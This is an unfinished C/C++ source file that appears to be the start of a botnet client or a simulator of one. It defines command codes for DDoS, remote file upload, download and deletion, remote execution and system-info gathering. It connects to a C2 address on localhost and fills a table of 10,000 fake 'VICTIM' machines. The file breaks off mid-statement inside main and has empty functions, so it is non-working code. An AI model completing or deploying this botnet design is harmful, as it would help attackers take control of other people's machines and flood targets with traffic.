#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <errno.h>


#define CDDOS 0x01
#define C_STOP 0x02
#define C_REMOVE 0x03
#define C_GETDRIVE 0x04
#define C_SHOWFILELIST 0x05
#define C_UPLOADFILE 0x06
#define C_DOWNLOADFILE 0x07
#define C_FILEDEL 0x08
#define C_REMOTERUN 0x09
#define C_SYSTEMINFO 0x15
#define CLIENTS 10000
typedef struct clients
{
    unsigned int passcode;
    int version;
    unsigned int cpu;
    unsigned int memory;
    char compname[100];
    
}clientauth;

typedef int SOCKET;

SOCKET recvSocket;
SOCKET sendSocket;

char C2[15] = "127.0.0.1";
short c2_port = 1990;

clientauth megaclientlist[CLIENTS];



unsigned short csum(unsigned short *buf, int nwords)
{       //
	unsigned long sum;
    for(sum=0; nwords>0; nwords--)
            sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int setListenerThread(void* ptr)
{
    
}

void printclientlist()
{
    for(int i = 0; i < CLIENTS; i++)
    {
        
    }
}
int makeclientlist()
{
    //zero out the structure
    memset(megaclientlist, 0, sizeof(megaclientlist));
    char *ch = 0;
    ch = (char*)malloc(99);
    for(int i = 0; i < CLIENTS; i++)
    {
        sprintf(ch,"VICTIM %d", i);
        megaclientlist[i].passcode = 123456;
        megaclientlist[i].version = rand()%5;
        megaclientlist[i].cpu = rand()%5000;
        megaclientlist[i].memory = rand()%1024;
        strcpy(megaclientlist[i].compname, ch);
    }
    
}

int main(int argc, char** argv)
{
    srand(time(0));
    //create a socket and connect to the C2
    struct sockaddr_in server_sock;
    memset(&server_sock, 0, sizeof(server_sock));
    
    server_sock.sin_family = AF_INET;
    server_sock.sin_addr.s_addr = inet_addr(C2);
    server_sock.sin_port = htons(c2_port);
    
    
    sendSocket =
}